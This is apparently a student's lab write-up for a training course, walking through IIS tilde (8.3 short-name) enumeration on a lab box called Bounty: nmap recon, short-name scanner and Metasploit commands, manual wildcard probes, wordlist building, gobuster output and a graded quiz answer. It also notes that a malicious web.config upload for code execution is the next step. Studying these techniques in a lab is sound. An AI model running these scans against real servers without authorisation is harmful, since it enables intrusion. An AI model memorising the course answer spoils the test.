# Section 25 — IIS Tilde Enumeration

**The bug:** Windows generates a legacy **8.3 short name** for every file/dir (e.g. `transfer.aspx` → `TRANSF~1.ASP`). Vulnerable IIS versions leak whether a short name exists via different HTTP status codes when you probe with a `~` and wildcards — letting an unauthenticated attacker **brute-force hidden file/dir names one character at a time** without any directory listing.

**Affected:** IIS ≤ 7.5 broadly (and later versions in some configs). The probe uses `GET`/`OPTIONS` with `*` and `~` wildcards.

**Why it matters:** short names reveal *that* `TRANSF~1.ASP` exists; you then only need to brute-force the **full** name (`transfer.aspx`) — a tiny keyspace because you already know the prefix and extension.

---

## Step 1 — Recon

```bash
nmap -p- -sV -sC --open 10.129.100.120
```
Verified output (Bounty):
```
80/tcp open  http  Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
```
> `-p-` (all ports — IIS may not be on 80), `-sV` (version → **IIS 7.5**, in tilde-vulnerable range), `--open` (hide noise). `Server: Microsoft-IIS/7.5` + title `Bounty` confirms the target. **Bounty is slow** — expect multi-second responses and use generous timeouts everywhere.

---

## Step 2 — Tilde / 8.3 short-name scan

**Taught tool — IIS-ShortName-Scanner** (`github.com/irsdl/IIS-ShortName-Scanner`, needs Oracle Java):
```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.100.120/
# proxy prompt -> just press Enter (No)
```
Expected result (matches the module):
```
|_ Result: Vulnerable!
|_ Suffix (magic part): /~1/
|_ Identified directories: ASPNET~1 , UPLOAD~1
|_ Identified files:     TRANSF~1.ASP , CSASPX~1.CS , ...
```

**Practical alternatives (the jar isn't on this Kali build):**
```bash
# A) Metasploit module (present at /usr/share/metasploit-framework):
msfconsole -q
msf> use auxiliary/scanner/http/iis_shortname_scanner
msf> set RHOSTS 10.129.100.120 ; set RPORT 80 ; run

# B) shortscan (bitquark) if you install it:
go install github.com/bitquark/shortscan/cmd/shortscan@latest
shortscan http://10.129.100.120/
```
> The `0 5` args = scan-mode and thread/retry tuning; the tool walks the alphabet for you and reports the magic suffix (`~1`) plus every 8.3 name it can confirm. If you only have `msfconsole`, use the full module path `auxiliary/scanner/http/iis_shortname_scanner` (the short/ambiguous name fails to load on recent msf). The key takeaway from this target: a file short-named **`TRANSF~1.ASP`** exists but **GET is denied on it directly** — so you must recover the full name.

**Manual primitive (how the tools work under the hood):**
```
GET /transf*~1*/.aspx   -> 404  (a name with that prefix EXISTS)
GET /zzzzzz*~1*/.aspx   -> 400  (no such prefix -> bad request)
```
> IIS treats `*` as a wildcard in this bug. **404 = the partial short name resolved (exists); 400 = it didn't.** Walk prefix characters until 404s stop narrowing → you've got the 8.3 name. (Bounty is flaky under rapid sequential probes — pace requests / raise `curl -m`.)

---

## Step 3 — Build a targeted wordlist

The short name gave us the prefix `transf`. Brute-force the full name from real words starting with it:

```bash
# Module's exact command:
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt

# Cleaner (recommended) — strip filenames with -h, dedupe, drop junk:
egrep -rh '^transf' /usr/share/wordlists/* 2>/dev/null | sort -u > /tmp/list.txt
```
> `^transf` = lines starting with the recovered prefix; `sed 's/^[^:]*://'` strips the `file:` prefix grep adds with `-r`. **Gotcha hit live:** SecLists ships a *moby thesaurus* file whose `transfer,...` line is thousands of comma-joined synonyms — it ends up as one giant useless entry that just yields HTTP 400s. Using `egrep -rh` (no filenames) + `sort -u` and ignoring comma-blob lines keeps the list clean (~3000 candidates here).

---

## Step 4 — Gobuster the full filename

```bash
gobuster dir -u http://10.129.100.120/ -w /tmp/list.txt -x .aspx,.asp -t 20 --timeout 15s
```
✅ **Verified live output:**
```
transfer.aspx        (Status: 200) [Size: 941]
```
> `-x .aspx,.asp` appends both extensions to every word (the short name was `TRANSF~1.ASP*` — could be `.asp` or `.aspx`); raise `--timeout`/lower threads because Bounty is slow. The clean 200 (941 bytes — identical to the module's reference) on **`transfer.aspx`** is the answer. (It's Bounty's unauthenticated file-upload page → next step would be the `web.config` upload RCE.)

---

## ✅ Answer

**§25 Q1 — "What is the full .aspx filename that Gobuster identified?" → `transfer.aspx`**

> Runtime value → verified by running the actual chain against `10.129.100.120` (gobuster `200`, `Size: 941`), not recalled from a writeup (the §22 rule).

---

## Exam Notes

- **IIS ≤ 7.5 → always try tilde enumeration.** It converts "blind unknown filename" into "known prefix + extension" = trivially brute-forceable.
- **404 = short-name prefix exists; 400 = doesn't.** That single status-code oracle is the whole vulnerability.
- **`~1` is the disambiguator** — `somefi~1.txt` vs `somefi~2.txt` for `somefile.txt`/`somefile1.txt`. More than ~4 collisions and you may need higher indices.
- **Direct GET on the short name is often blocked** (`TRANSF~1.ASP` → denied) — that's expected; recover the full name with a prefix-seeded wordlist + gobuster `-x` extensions.
- **Wordlist hygiene:** `egrep -rh ... | sort -u`; SecLists' moby thesaurus injects a massive comma-blob line — filter it or it wastes requests on 400s.
- **Bounty/IIS labs are slow & flaky** — generous timeouts, modest threads; `HTTP 000`/empty just means it didn't answer in time, retry, don't conclude "not there."
- Tools: `iis_shortname_scanner.jar` (taught), `auxiliary/scanner/http/iis_shortname_scanner` (msf, on-box), `shortscan` (Go, fast).

---

## Lab Walkthrough (quick steps)

```
1. nmap -p- -sV -sC --open <ip>           -> Microsoft-IIS/7.5, title "Bounty"
2. tilde scan (jar / msf module / shortscan)
                                           -> dirs ASPNET~1, UPLOAD~1 ; file TRANSF~1.ASP
3. egrep -rh '^transf' /usr/share/wordlists/* | sort -u > /tmp/list.txt
4. gobuster dir -u http://<ip>/ -w /tmp/list.txt -x .aspx,.asp -t 20 --timeout 15s
5. -> transfer.aspx (Status: 200) [Size: 941]   ✅  = §25 Q1 answer (verified live)
```

> The technique in one line: short-name leak gives you the **prefix + extension**, gobuster fills in the middle. Next on Bounty: upload a malicious `web.config` via `transfer.aspx` for RCE.
